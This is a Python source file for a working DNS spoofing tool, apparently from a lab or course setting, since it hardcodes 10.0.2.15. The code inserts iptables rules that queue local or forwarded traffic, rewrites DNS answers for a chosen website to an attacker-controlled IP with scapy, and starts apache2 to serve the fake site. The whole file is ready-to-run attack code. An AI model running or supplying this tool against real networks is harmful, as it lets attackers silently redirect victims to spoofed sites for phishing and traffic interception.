import netfilterqueue
import subprocess
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR
import optparse
import re


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-m", "--machine", dest="machine", help="Machine to execute command on (local/remote)")
    parser.add_option("-s", "--spoof", dest="spoof", help="Website to spoof")
    parser.add_option("-d", "--destination", dest="destination", help="Website to redirect to")
    (arguments, options) = parser.parse_args()
    if not arguments.machine or not bool(re.match(r"(^local$)|(^remote$)", arguments.machine)):
        print("[-] Invalid input; Please specify a machine; Use -h or --help for more info")
        exit(0)
    elif not arguments.spoof:
        print("[-] Invalid input; Please specify a website; Use -h or --help for more info")
        exit(0)
    elif not arguments.destination or not bool(re.match(r"10.0.2.15", arguments.destination)):
        print("[-] Invalid input; Please specify a destination; Use -h or --help for more info")
        exit(0)
    else:
        return arguments


def local_machine_rules():
    subprocess.call(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] Setting iptables for local machine")


def remote_machine_rules():
    subprocess.call(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] Setting iptables for remote machine")


def check_machine(machine):
    if machine == "local":
        return local_machine_rules
    elif machine == "remote":
        return remote_machine_rules
    else:
        print("[-] Invalid machine")
        exit(0)


def check_destination(destination):
    current_ip = subprocess.check_output(["hostname", "-I"]).decode().strip()
    if destination == current_ip:
        subprocess.call(["sudo", "service", "apache2", "start"])
        print("[+] Starting localhost")
    else:
        print("Error")


def process_packets(packet):
    scapy_packet = IP(packet.get_payload())  # Converted to scapy packet
    if scapy_packet.haslayer(DNSRR):
        website_name = scapy_packet[DNSQR].qname.decode()
        website_ip = scapy_packet[DNSRR].rdata
        destination = arguments.destination
        if arguments.spoof in website_name:
            spoofed_dnsrr_packet = DNSRR(rrname=website_name, rdata=destination)
            scapy_packet[DNS].an = spoofed_dnsrr_packet
            scapy_packet[DNS].ancount = 1

            del scapy_packet[IP].len
            del scapy_packet[IP].chksum

            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum

            packet.set_payload(bytes(scapy_packet))

            print("[+] Spoofing DNS for ==> " + website_name
                  + " at IP ==> " + str(website_ip)
                  + " to IP ==> " + str(destination))

    packet.accept()


def queue_packets():
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(0, process_packets)
        print("[+] Starting DNS spoof")
        iptables_rule = check_machine(arguments.machine)
        iptables_rule()
        check_destination(arguments.destination)
        print("[+] DNS spoof started successfully!\n\n")
        queue.run()
    except KeyboardInterrupt:
        print("\n\n[-] Closing DNS spoof")
        subprocess.call(["sudo", "iptables", "--flush"])
        print("[-] Flushing iptables")
        subprocess.call(["sudo", "service", "apache2", "stop"])
        print("[-] Stopping localhost")
        print("[-] DNS spoof ended successfully!")


arguments = get_arguments()
queue_packets()
